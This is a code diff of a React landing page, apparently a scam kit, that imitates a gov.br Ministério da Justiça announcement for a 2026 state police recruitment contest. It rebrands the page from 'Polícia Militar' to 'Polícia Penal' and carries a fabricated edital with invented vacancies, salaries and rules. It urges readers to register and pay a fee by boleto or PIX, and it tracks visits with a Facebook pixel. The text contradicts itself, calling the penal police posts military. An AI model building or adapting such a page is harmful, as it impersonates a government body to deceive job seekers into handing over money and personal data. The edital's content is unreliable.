@@ -46,13 +46,13 @@ export default function HealthRegistrationPage() {
   }, []);
 
   // derived geo values — used throughout the page
-  const sigla      = estadoPM?.sigla ?? 'PM';
-  const nomeCorpo  = estadoPM?.nomeCompleto ?? 'Polícias Militares estaduais';
+  const sigla      = estadoPM?.sigla ?? 'PP';
+  const nomeCorpo  = estadoPM?.nomeCompleto ?? 'Polícias Penais estaduais';
   const vSoldado   = estadoPM?.vagasSoldado ?? 800;
   const vOficial   = estadoPM?.vagasOficial ?? 200;
   const vTotal     = vSoldado + vOficial;
   const fmt        = (n: number) => n.toLocaleString('pt-BR');
-  const editalSlug = estadoPM ? `Edital ${sigla} 2026` : 'Edital PM 2026';
+  const editalSlug = estadoPM ? `Edital ${sigla} 2026` : 'Edital PP 2026';
 
   useEffect(() => {
     const urlParams = new URLSearchParams(window.location.search);
@@ -80,7 +80,7 @@ export default function HealthRegistrationPage() {
     if (fbq) {
       fbq('track', 'ViewContent', {
         content_name: editalSlug,
-        content_category: `Polícia Militar — MJSP${estadoPM ? ` / ${estadoPM.sigla}` : ''}`,
+        content_category: `Polícia Penal — MJSP${estadoPM ? ` / ${estadoPM.sigla}` : ''}`,
         value: 4936.00,
         currency: 'BRL'
       });
@@ -99,7 +99,7 @@ export default function HealthRegistrationPage() {
     if (fbq) {
       fbq('track', 'ViewContent', {
         content_name: editalSlug,
-        content_category: `Polícia Militar — MJSP${estadoPM ? ` / ${estadoPM.sigla}` : ''}`,
+        content_category: `Polícia Penal — MJSP${estadoPM ? ` / ${estadoPM.sigla}` : ''}`,
         value: 4936.00,
         currency: 'BRL'
       });
@@ -138,31 +138,31 @@ export default function HealthRegistrationPage() {
 
   const editalConteudo = [
     `EDITAL ${editalSlug.toUpperCase()} — CONCURSO PÚBLICO${estadoPM ? ` DA ${estadoPM.nomeCompleto.toUpperCase()}` : ' NACIONAL'} PARA PROVIMENTO DE CARGOS DE SOLDADO DE 2ª CLASSE E ASPIRANTE-A-OFICIAL`,
-    `O MINISTÉRIO DA JUSTIÇA E SEGURANÇA PÚBLICA — MJSP, por meio da Secretaria Nacional de Segurança Pública — SENASP, no uso de suas atribuições legais e com base na autorização expedida pelo Ministério da Gestão e da Inovação em Serviços Públicos, torna público o presente Edital de Abertura de Concurso Público, destinado ao provimento de vagas na${estadoPM ? ` ${estadoPM.nomeCompleto}` : 's Polícias Militares estaduais participantes'}, em conformidade com os convênios firmados entre a União e os Estados signatários.`,
+    `O MINISTÉRIO DA JUSTIÇA E SEGURANÇA PÚBLICA — MJSP, por meio da Secretaria Nacional de Segurança Pública — SENASP, no uso de suas atribuições legais e com base na autorização expedida pelo Ministério da Gestão e da Inovação em Serviços Públicos, torna público o presente Edital de Abertura de Concurso Público, destinado ao provimento de vagas na${estadoPM ? ` ${estadoPM.nomeCompleto}` : 's Polícias Penais estaduais participantes'}, em conformidade com os convênios firmados entre a União e os Estados signatários.`,
     "CAPÍTULO I — DAS DISPOSIÇÕES PRELIMINARES",
-    `Art. 1º O presente concurso público destina-se ao provimento de ${fmt(vTotal)} vagas${estadoPM ? ` na ${estadoPM.nomeCompleto}` : ' distribuídas entre as Polícias Militares dos estados conveniados'}, sendo ${fmt(vSoldado)} vagas para o cargo de Soldado de 2ª Classe PM (nível médio) e ${fmt(vOficial)} vagas para o cargo de Aspirante-a-Oficial PM (nível superior), com lotação a ser definida conforme necessidade operacional da corporação.`,
+    `Art. 1º O presente concurso público destina-se ao provimento de ${fmt(vTotal)} vagas${estadoPM ? ` na ${estadoPM.nomeCompleto}` : ' distribuídas entre as Polícias Penais dos estados conveniados'}, sendo ${fmt(vSoldado)} vagas para o cargo de Soldado de 2ª Classe PP (nível médio) e ${fmt(vOficial)} vagas para o cargo de Aspirante-a-Oficial PP (nível superior), com lotação a ser definida conforme necessidade operacional da corporação.`,
     "§ 1º As vagas serão distribuídas nos municípios de maior carência operacional, observada a ordem de classificação dos candidatos e o regulamento interno da corporação.",
     "§ 2º A necessidade deste certame decorre do déficit histórico no efetivo policial, acentuado pelo aumento das aposentadorias programadas no período 2024–2028 e pelo crescimento das demandas de segurança pública em regiões metropolitanas e municípios do interior.",
-    "Art. 2º Os cargos a que se refere este edital são de natureza militar estadual, com regime jurídico próprio das Polícias Militares, asseguradas as prerrogativas inerentes à carreira policial-militar e os benefícios previstos nos estatutos dos militares estaduais.",
+    "Art. 2º Os cargos a que se refere este edital são de natureza militar estadual, com regime jurídico próprio das Polícias Penais, asseguradas as prerrogativas inerentes à carreira policial-militar e os benefícios previstos nos estatutos dos militares estaduais.",
     "CAPÍTULO II — DOS CARGOS, VAGAS E REMUNERAÇÃO",
-    `Art. 3º São ofertados os seguintes cargos: I — Soldado de 2ª Classe PM: ${fmt(vSoldado)} vagas, nível médio, subsídio inicial de R$ 4.936,00 (quatro mil, novecentos e trinta e seis reais) durante o Curso de Formação de Soldados — CFSd, evoluindo para subsídio pleno após a conclusão da formação e promoção a Soldado de 1ª Classe; II — Aspirante-a-Oficial PM: ${fmt(vOficial)} vagas, nível superior, subsídio durante o Curso de Formação de Oficiais — CFO de R$ 8.900,00 (oito mil e novecentos reais), com progressão na carreira até os postos de Oficial Superior.`,
+    `Art. 3º São ofertados os seguintes cargos: I — Soldado de 2ª Classe PP: ${fmt(vSoldado)} vagas, nível médio, subsídio inicial de R$ 4.936,00 (quatro mil, novecentos e trinta e seis reais) durante o Curso de Formação de Soldados — CFSd, evoluindo para subsídio pleno após a conclusão da formação e promoção a Soldado de 1ª Classe; II — Aspirante-a-Oficial PP: ${fmt(vOficial)} vagas, nível superior, subsídio durante o Curso de Formação de Oficiais — CFO de R$ 8.900,00 (oito mil e novecentos reais), com progressão na carreira até os postos de Oficial Superior.`,
     "§ 1º Os aprovados farão jus, ainda, a adicional de risco de vida e insalubridade, auxílio-alimentação, auxílio-fardamento, auxílio-transporte, plano de saúde corporativo da corporação estadual, férias de 30 (trinta) dias anuais, 13º salário e progressão por antiguidade e merecimento, nos termos dos estatutos militares estaduais vigentes.",
     "§ 2º Durante o Curso de Formação (CFSd ou CFO), o candidato receberá subsídio integral e terá acesso ao rancho, alojamento e fardamento fornecidos pela corporação, conforme regulamento interno.",
     "§ 3º Após a conclusão do Curso de Formação e promoção ao posto inicial, o servidor policial-militar adquire estabilidade nos termos do Estatuto dos Militares Estaduais, observado o desempenho satisfatório no estágio probatório.",
     "CAPÍTULO III — DOS REQUISITOS PARA INSCRIÇÃO",
-    "Art. 4º Poderá inscrever-se no concurso o candidato que, na data da matrícula no Curso de Formação, preencha os seguintes requisitos: I — ser brasileiro nato; II — para o cargo de Soldado PM: ter idade entre 18 (dezoito) e 30 (trinta) anos; para o cargo de Aspirante-a-Oficial PM: ter idade entre 18 (dezoito) e 28 (vinte e oito) anos; III — possuir, para Soldado PM, Ensino Médio completo; IV — possuir, para Aspirante-a-Oficial PM, diploma de curso de nível superior em qualquer área, reconhecido pelo MEC; V — ter altura mínima de 1,65 m (homens) ou 1,60 m (mulheres); VI — estar em situação regular com a Justiça Eleitoral e, se do sexo masculino, com o Serviço Militar; VII — não possuir antecedentes criminais e não ter sido demitido do serviço público por justa causa; VIII — possuir Carteira Nacional de Habilitação — CNH categoria B (recomendável à época da inscrição; obrigatória na posse).",
+    "Art. 4º Poderá inscrever-se no concurso o candidato que, na data da matrícula no Curso de Formação, preencha os seguintes requisitos: I — ser brasileiro nato; II — para o cargo de Soldado PP: ter idade entre 18 (dezoito) e 30 (trinta) anos; para o cargo de Aspirante-a-Oficial PP: ter idade entre 18 (dezoito) e 28 (vinte e oito) anos; III — possuir, para Soldado PP, Ensino Médio completo; IV — possuir, para Aspirante-a-Oficial PP, diploma de curso de nível superior em qualquer área, reconhecido pelo MEC; V — ter altura mínima de 1,65 m (homens) ou 1,60 m (mulheres); VI — estar em situação regular com a Justiça Eleitoral e, se do sexo masculino, com o Serviço Militar; VII — não possuir antecedentes criminais e não ter sido demitido do serviço público por justa causa; VIII — possuir Carteira Nacional de Habilitação — CNH categoria B (recomendável à época da inscrição; obrigatória na posse).",
     "§ 1º São reservadas vagas para candidatos Pretos e Pardos (20%), Pessoas com Deficiência — PcD (5%), Indígenas e Quilombolas, conforme legislação federal e estadual vigente, desde que compatíveis com as atribuições do cargo.",
     "CAPÍTULO IV — DAS INSCRIÇÕES",
     "Art. 5º As inscrições serão realizadas exclusivamente pela internet, no portal oficial da banca organizadora responsável, no período de " + dataInicioInscricoes + " a " + dataPrazoInscricoes + ".",
-    "Art. 6º A taxa de inscrição é de R$ 90,00 (noventa reais) para o cargo de Soldado de 2ª Classe PM e R$ 120,00 (cento e vinte reais) para o cargo de Aspirante-a-Oficial PM, sendo assegurada isenção nos termos da lei para candidatos em situação de hipossuficiência econômica.",
+    "Art. 6º A taxa de inscrição é de R$ 90,00 (noventa reais) para o cargo de Soldado de 2ª Classe PP e R$ 120,00 (cento e vinte reais) para o cargo de Aspirante-a-Oficial PP, sendo assegurada isenção nos termos da lei para candidatos em situação de hipossuficiência econômica.",
     "CAPÍTULO V — DAS ETAPAS DO CONCURSO PÚBLICO",
     "Art. 7º O concurso público será composto pelas seguintes etapas, todas de caráter eliminatório: I — Prova Objetiva, eliminatória e classificatória, aplicada em todo o território nacional; II — Teste de Aptidão Física — TAF, eliminatório, composto por provas de resistência cardiovascular (corrida 12 min ou 2.400 m), força de membros superiores (flexão de braço) e resistência abdominal (abdominal cronometrado), com índices mínimos por sexo e faixa etária; III — Avaliação Psicológica, eliminatória, destinada a aferir o equilíbrio emocional, a maturidade e o perfil comportamental compatíveis com a atividade policial-militar; IV — Investigação Social e de Vida Pregressa, eliminatória, com análise de antecedentes criminais, cíveis e administrativos; V — Exame Médico, eliminatório, para verificação das condições de saúde física e mental exigidas para o exercício da função policial-militar; VI — Curso de Formação de Soldados — CFSd ou Curso de Formação de Oficiais — CFO, eliminatório, com duração mínima de 6 (seis) meses, em regime de internato.",
-    "Art. 8º A Prova Objetiva, para o cargo de Soldado de 2ª Classe PM, abrangerá as disciplinas: Língua Portuguesa, Raciocínio Lógico e Matemática, Conhecimentos Gerais, Legislação Penal Básica (Código Penal e Código de Processo Penal — parte geral) e Direitos Humanos e Cidadania. Para o cargo de Aspirante-a-Oficial PM, inclui adicionalmente Direito Constitucional, Direito Penal, Direito Processual Penal e Administração Pública.",
+    "Art. 8º A Prova Objetiva, para o cargo de Soldado de 2ª Classe PP, abrangerá as disciplinas: Língua Portuguesa, Raciocínio Lógico e Matemática, Conhecimentos Gerais, Legislação Penal Básica (Código Penal e Código de Processo Penal — parte geral) e Direitos Humanos e Cidadania. Para o cargo de Aspirante-a-Oficial PP, inclui adicionalmente Direito Constitucional, Direito Penal, Direito Processual Penal e Administração Pública.",
     "§ 1º A prova conterá 100 (cem) questões objetivas de múltipla escolha, sendo exigido o mínimo de 50% (cinquenta por cento) de acertos no total e mínimo de 40% (quarenta por cento) em cada disciplina para classificação.",
     "§ 2º As provas serão aplicadas nos 26 (vinte e seis) estados da federação e no Distrito Federal, nas datas previstas a partir de " + dataProvaEdital + ".",
     "CAPÍTULO VI — DA VALIDADE E NOMEAÇÃO",
     `Art. 9º O concurso público terá validade de 2 (dois) anos, prorrogável por igual período, a contar da homologação do resultado final. Os candidatos aprovados dentro do número de vagas serão convocados por ato do Secretário Nacional de Segurança Pública${estadoPM ? ` e do Comandante-Geral da ${estadoPM.sigla}` : ''}, observada a ordem de classificação e a disponibilidade de vagas.`,
-    `Art. 10. A necessidade de abertura deste concurso decorre do déficit histórico no efetivo da${estadoPM ? ` ${estadoPM.nomeCompleto}` : 's Polícias Militares estaduais'}, agravado pela projeção de aposentadoria de aproximadamente 18% do efetivo atual no período 2024–2028, e pela crescente demanda por segurança pública nas regiões metropolitanas e municípios do interior.`,
+    `Art. 10. A necessidade de abertura deste concurso decorre do déficit histórico no efetivo da${estadoPM ? ` ${estadoPM.nomeCompleto}` : 's Polícias Penais estaduais'}, agravado pela projeção de aposentadoria de aproximadamente 18% do efetivo atual no período 2024–2028, e pela crescente demanda por segurança pública nas regiões metropolitanas e municípios do interior.`,
     "CAPÍTULO VII — DAS DISPOSIÇÕES FINAIS",
     `Art. 11. Os casos omissos serão resolvidos pela Comissão do Concurso Público${estadoPM ? ` da ${estadoPM.sigla}` : ''}, observadas as normas vigentes e os regulamentos do MJSP e da SENASP.`,
     "Brasília, " + dataInicioInscricoes + ".",
@@ -172,7 +172,7 @@ export default function HealthRegistrationPage() {
   return (
     <div className="min-h-screen bg-white" style={{ fontFamily: 'Rawline, Arial, sans-serif' }}>
       <ExercitoHeader
-        customTitle={estadoPM ? estadoPM.sigla : 'Polícia Militar'}
+        customTitle={estadoPM ? estadoPM.sigla : 'Polícia Penal'}
         customSubtitle={editalSlug}
       />
       <nav aria-label="Você está em">
@@ -181,7 +181,7 @@ export default function HealthRegistrationPage() {
             {[
               { label: null, icon: 'fas fa-home', href: '#' },
               { label: 'Ministério da Justiça', href: '#' },
-              { label: estadoPM ? estadoPM.sigla : 'Polícia Militar', href: '#' },
+              { label: estadoPM ? estadoPM.sigla : 'Polícia Penal', href: '#' },
               { label: 'Concurso Público', href: '#' },
               { label: editalSlug, href: null },
             ].map((item, i, arr) => (
@@ -216,15 +216,15 @@ export default function HealthRegistrationPage() {
           <h1 className="font-bold mb-4" style={{ color: '#0c326f', fontSize: '1.5rem', lineHeight: '2.1rem' }}>
             {estadoPM
               ? <>Concurso {estadoPM.sigla} 2026: <strong>{fmt(vTotal)} vagas</strong> para Soldado e Oficial da <strong>{estadoPM.nomeCompleto}</strong></>
-              : <>Concurso PM 2026: 1.000 vagas para Soldado e Oficial das Polícias Militares estaduais em todo o Brasil</>
+              : <>Concurso PP 2026: 1.000 vagas para Soldado e Oficial das Polícias Penais estaduais em todo o Brasil</>
             }
           </h1>
 
           <p className="text-lg text-[#555555] leading-relaxed mb-4">
             {estadoPM ? (
-              <>A <strong>{estadoPM.nomeCompleto}</strong> abre <strong>{fmt(vTotal)} vagas</strong> neste edital: <strong>{fmt(vSoldado)} vagas de Soldado de 2ª Classe PM</strong> (nível médio, subsídio de R$ 4.936,00) e <strong>{fmt(vOficial)} vagas de Aspirante-a-Oficial PM</strong> (nível superior, subsídio de R$ 8.900,00+), coordenado pelo Ministério da Justiça e Segurança Pública (SENASP).</>
+              <>A <strong>{estadoPM.nomeCompleto}</strong> abre <strong>{fmt(vTotal)} vagas</strong> neste edital: <strong>{fmt(vSoldado)} vagas de Soldado de 2ª Classe PP</strong> (nível médio, subsídio de R$ 4.936,00) e <strong>{fmt(vOficial)} vagas de Aspirante-a-Oficial PP</strong> (nível superior, subsídio de R$ 8.900,00+), coordenado pelo Ministério da Justiça e Segurança Pública (SENASP).</>
             ) : (
-              <>O <strong>Ministério da Justiça e Segurança Pública</strong> abre <strong>1.000 vagas nacionais</strong>: <strong>800 vagas de Soldado de 2ª Classe PM</strong> (nível médio, subsídio de R$ 4.936,00) e <strong>200 vagas de Aspirante-a-Oficial PM</strong> (nível superior, subsídio de R$ 8.900,00+), com distribuição entre as corporações estaduais conveniadas.</>
+              <>O <strong>Ministério da Justiça e Segurança Pública</strong> abre <strong>1.000 vagas nacionais</strong>: <strong>800 vagas de Soldado de 2ª Classe PP</strong> (nível médio, subsídio de R$ 4.936,00) e <strong>200 vagas de Aspirante-a-Oficial PP</strong> (nível superior, subsídio de R$ 8.900,00+), com distribuição entre as corporações estaduais conveniadas.</>
             )}
           </p>
 
@@ -287,7 +287,7 @@ export default function HealthRegistrationPage() {
 
           <img 
             src={lula__1_}
-            alt={`${editalSlug} — Concurso Público para Soldado e Oficial${estadoPM ? ` da ${estadoPM.nomeCompleto}` : ' das Polícias Militares Estaduais'}`}
+            alt={`${editalSlug} — Concurso Público para Soldado e Oficial${estadoPM ? ` da ${estadoPM.nomeCompleto}` : ' das Polícias Penais Estaduais'}`}
             className="w-full mb-6 rounded shadow-sm"
             onClick={handleRegistration}
             fetchPriority="high"
@@ -301,7 +301,7 @@ export default function HealthRegistrationPage() {
             {estadoPM ? (
               <>carreira na <strong>{estadoPM.nomeCompleto}</strong> oferece o que poucos empregos garantem: <strong>estabilidade no serviço público estadual</strong>, remuneração competitiva desde o primeiro dia de formação, plano de saúde, progressão por patentes e uma carreira de longo prazo com reconhecimento institucional. O ingresso se dá por concurso público — sem indicação, sem exceções.</>
             ) : (
-              <>carreira nas <strong>Polícias Militares estaduais</strong> oferece o que poucos empregos garantem: <strong>estabilidade no serviço público</strong>, remuneração competitiva desde o primeiro dia de formação, plano de saúde, progressão por patentes e uma carreira de longo prazo com reconhecimento institucional. O ingresso se dá por concurso público — sem indicação, sem exceções.</>
+              <>carreira nas <strong>Polícias Penais estaduais</strong> oferece o que poucos empregos garantem: <strong>estabilidade no serviço público</strong>, remuneração competitiva desde o primeiro dia de formação, plano de saúde, progressão por patentes e uma carreira de longo prazo com reconhecimento institucional. O ingresso se dá por concurso público — sem indicação, sem exceções.</>
             )}
           </p>
 
@@ -339,7 +339,7 @@ export default function HealthRegistrationPage() {
             {estadoPM ? (
               <>A <strong>{estadoPM.nomeCompleto}</strong> acumula um <strong>déficit histórico de efetivo</strong> — projeções do Ministério da Justiça e Segurança Pública indicam que aproximadamente <strong>18% do contingente atual se aposentará até 2028</strong>, sem reposição proporcional nas últimas décadas. Somado ao crescimento das demandas de segurança pública no estado, o governo coordena o <strong>{editalSlug}</strong>, o maior processo seletivo da corporação em mais de uma década.</>
             ) : (
-              <>As Polícias Militares estaduais acumulam um <strong>déficit histórico de efetivo</strong> — projeções do Ministério da Justiça e Segurança Pública indicam que aproximadamente <strong>18% do contingente atual se aposentará até 2028</strong>, sem reposição proporcional nas últimas décadas. Somado ao crescimento das demandas de segurança pública em regiões metropolitanas e municípios do interior, os governos estaduais coordenam o <strong>Edital PM 2026</strong>, o maior processo seletivo das corporações militares estaduais em mais de uma década.</>
+              <>As Polícias Penais estaduais acumulam um <strong>déficit histórico de efetivo</strong> — projeções do Ministério da Justiça e Segurança Pública indicam que aproximadamente <strong>18% do contingente atual se aposentará até 2028</strong>, sem reposição proporcional nas últimas décadas. Somado ao crescimento das demandas de segurança pública em regiões metropolitanas e municípios do interior, os governos estaduais coordenam o <strong>Edital PP 2026</strong>, o maior processo seletivo das corporações militares estaduais em mais de uma década.</>
             )}
           </p>
 
@@ -351,7 +351,7 @@ export default function HealthRegistrationPage() {
               Por que a {sigla} está abrindo vagas agora?
             </p>
             <p className="text-lg leading-relaxed" style={{ color: '#444' }}>
-              O efetivo da{estadoPM ? ` ${estadoPM.nomeCompleto}` : 's Polícias Militares estaduais'} está abaixo do índice recomendado pela ONU de <strong>3 policiais por 1.000 habitantes</strong>{estadoPM ? ' no estado' : ' em mais de 60% dos estados brasileiros'}. A onda de aposentadorias prevista para o período <strong>2024–2028</strong> agravará esse déficit sem reposição imediata. O <strong>{editalSlug}</strong> é a resposta estrutural dos governos estaduais para modernizar e recompor o efetivo das corporações.
+              O efetivo da{estadoPM ? ` ${estadoPM.nomeCompleto}` : 's Polícias Penais estaduais'} está abaixo do índice recomendado pela ONU de <strong>3 policiais por 1.000 habitantes</strong>{estadoPM ? ' no estado' : ' em mais de 60% dos estados brasileiros'}. A onda de aposentadorias prevista para o período <strong>2024–2028</strong> agravará esse déficit sem reposição imediata. O <strong>{editalSlug}</strong> é a resposta estrutural dos governos estaduais para modernizar e recompor o efetivo das corporações.
             </p>
           </div>
 
@@ -360,7 +360,7 @@ export default function HealthRegistrationPage() {
           <ol style={{ listStyle: 'none', padding: 0, margin: '0 0 24px', fontSize: '1.125rem', color: '#333' }}>
             {([
               <><strong>Acesse</strong> o portal de inscrições nesta página do <strong>gov.br</strong> e crie ou acesse sua conta.</>,
-              <><strong>Preencha</strong> o formulário com seus dados pessoais e escolha o cargo desejado (Soldado PM ou Aspirante-a-Oficial PM).</>,
+              <><strong>Preencha</strong> o formulário com seus dados pessoais e escolha o cargo desejado (Soldado PP ou Aspirante-a-Oficial PP).</>,
               <><strong>Pague a taxa</strong> de inscrição via boleto bancário ou PIX. Candidatos de baixa renda podem solicitar isenção conforme critérios do edital.</>,
               <><strong>Acompanhe</strong> o resultado da sua inscrição e os comunicados oficiais pelo mesmo portal. As provas ocorrem nos 26 estados e no Distrito Federal, com data prevista para <strong>{dataProvaEdital}</strong>.</>,
             ] as React.ReactNode[]).map((item, i) => (
@@ -381,7 +381,7 @@ export default function HealthRegistrationPage() {
             </div>
             <ol style={{ listStyle: 'none', padding: 0, margin: 0, fontSize: '1.125rem', color: '#333' }}>
               {([
-                <><strong>Escolaridade:</strong> Ensino Médio completo para Soldado PM; curso superior em qualquer área para Aspirante-a-Oficial.</>,
+                <><strong>Escolaridade:</strong> Ensino Médio completo para Soldado PP; curso superior em qualquer área para Aspirante-a-Oficial.</>,
                 <><strong>Altura mínima:</strong> 1,65 m para homens e 1,60 m para mulheres.</>,
                 <><strong>Aptidão física:</strong> aprovação no Teste de Aptidão Física (TAF) — corrida de 2.400 m, flexão de braço e abdominal. Etapa eliminatória.</>,
                 <><strong>Avaliação psicológica e investigação social:</strong> ambas eliminatórias. Sem antecedentes criminais.</>,
@@ -433,10 +433,10 @@ export default function HealthRegistrationPage() {
             </h3>
             <div className="space-y-3 text-[#555555]">
               <p>
-                O <strong>Soldado de 2ª Classe PM</strong> (nível médio) recebe subsídio inicial de <strong>R$ 4.936,00</strong> durante o Curso de Formação de Soldados — CFSd{estadoPM ? ` da ${estadoPM.sigla}` : ''}, evoluindo para o subsídio pleno após a promoção, acrescido de adicional de risco de vida, auxílio-alimentação, auxílio-fardamento e demais benefícios previstos no Estatuto dos Militares Estaduais.
+                O <strong>Soldado de 2ª Classe PP</strong> (nível médio) recebe subsídio inicial de <strong>R$ 4.936,00</strong> durante o Curso de Formação de Soldados — CFSd{estadoPM ? ` da ${estadoPM.sigla}` : ''}, evoluindo para o subsídio pleno após a promoção, acrescido de adicional de risco de vida, auxílio-alimentação, auxílio-fardamento e demais benefícios previstos no Estatuto dos Militares Estaduais.
               </p>
               <p>
-                O <strong>Aspirante-a-Oficial PM</strong> (nível superior) recebe subsídio de <strong>R$ 8.900,00+</strong> durante o Curso de Formação de Oficiais — CFO, com carreira progressiva até os postos de Oficial Superior. Somando subsídio, adicionais de risco, auxílios e benefícios, o pacote total de remuneração é um dos mais competitivos da segurança pública estadual para nível médio e superior.
+                O <strong>Aspirante-a-Oficial PP</strong> (nível superior) recebe subsídio de <strong>R$ 8.900,00+</strong> durante o Curso de Formação de Oficiais — CFO, com carreira progressiva até os postos de Oficial Superior. Somando subsídio, adicionais de risco, auxílios e benefícios, o pacote total de remuneração é um dos mais competitivos da segurança pública estadual para nível médio e superior.
               </p>
             </div>
           </div>
@@ -446,12 +446,12 @@ export default function HealthRegistrationPage() {
               Abertura de Inscrições
             </p>
             <p className="font-bold mb-5" style={{ fontSize: '1rem', color: '#1351b4' }}>
-              {editalSlug} — {estadoPM ? estadoPM.nomeCompleto : 'Polícias Militares Estaduais'}
+              {editalSlug} — {estadoPM ? estadoPM.nomeCompleto : 'Polícias Penais Estaduais'}
             </p>
 
             <dl style={{ display: 'grid', gridTemplateColumns: '160px 1fr', fontSize: '1.125rem', borderTop: '1px solid #e5e7eb' }}>
               {[
-                { label: 'Cargo(s)', value: 'Soldado de 2ª Classe PM (nível médio) · Aspirante-a-Oficial PM (nível superior)' },
+                { label: 'Cargo(s)', value: 'Soldado de 2ª Classe PP (nível médio) · Aspirante-a-Oficial PP (nível superior)' },
                 { label: 'Total de vagas', value: estadoPM ? `${fmt(vTotal)} vagas (${fmt(vSoldado)} Soldado + ${fmt(vOficial)} Oficial)` : '1.000 vagas (800 Soldado + 200 Oficial)' },
                 { label: 'Início das inscrições', value: dataInicioInscricoes },
                 { label: 'Encerramento', value: dataPrazoInscricoes, red: true },
@@ -511,7 +511,7 @@ export default function HealthRegistrationPage() {
               <><strong>Avaliação Psicológica</strong> — realizada por equipe técnica credenciada. Eliminatória.</>,
               <><strong>Investigação Social</strong> — verificação de antecedentes e conduta. Eliminatória.</>,
               <><strong>Exame de Saúde</strong> — avaliação médica e odontológica conforme padrões da corporação.</>,
-              <><strong>Curso de Formação</strong> — etapa final, realizada na Academia{estadoPM ? ` da ${estadoPM.sigla}` : ' de Polícia Militar'}. Duração média de 6 a 12 meses. Salário e benefícios pagos integralmente durante a formação.</>,
+              <><strong>Curso de Formação</strong> — etapa final, realizada na Academia{estadoPM ? ` da ${estadoPM.sigla}` : ' de Polícia Penal'}. Duração média de 6 a 12 meses. Salário e benefícios pagos integralmente durante a formação.</>,
             ] as React.ReactNode[]).map((item, i) => (
               <li key={i} style={{ display: 'flex', gap: '14px', padding: '7px 0', borderBottom: '1px solid #ebebeb', lineHeight: '1.6' }}>
                 <span style={{ minWidth: '28px', fontWeight: 700, color: '#555', fontSize: '0.8rem', paddingTop: '2px', flexShrink: 0 }}>{i + 1}.</span>
@@ -545,7 +545,7 @@ export default function HealthRegistrationPage() {
         <footer className="mt-12 pt-6 border-t border-gray-200">
           <div className="text-xs text-gray-600">
             <p className="font-semibold text-[#333] mb-1">
-              Assessoria de Comunicação — {estadoPM ? `${estadoPM.sigla} / MJSP` : 'MJSP / Polícia Militar'}
+              Assessoria de Comunicação — {estadoPM ? `${estadoPM.sigla} / MJSP` : 'MJSP / Polícia Penal'}
             </p>
             <p>Ministério da Justiça e Segurança Pública — {editalSlug}</p>
             <p className="mt-2 text-xs text-gray-500">
@@ -621,7 +621,7 @@ export default function HealthRegistrationPage() {
                   {editalSlug.toUpperCase()}
                 </h1>
                 <p style={{ fontSize: "12px", color: "#666", margin: 0, fontStyle: "italic", fontFamily: "'Times New Roman', Georgia, serif" }}>
-                  Concurso Público — {estadoPM ? estadoPM.nomeCompleto : 'Polícias Militares Estaduais / MJSP'}
+                  Concurso Público — {estadoPM ? estadoPM.nomeCompleto : 'Polícias Penais Estaduais / MJSP'}
                 </p>
               </div>
 
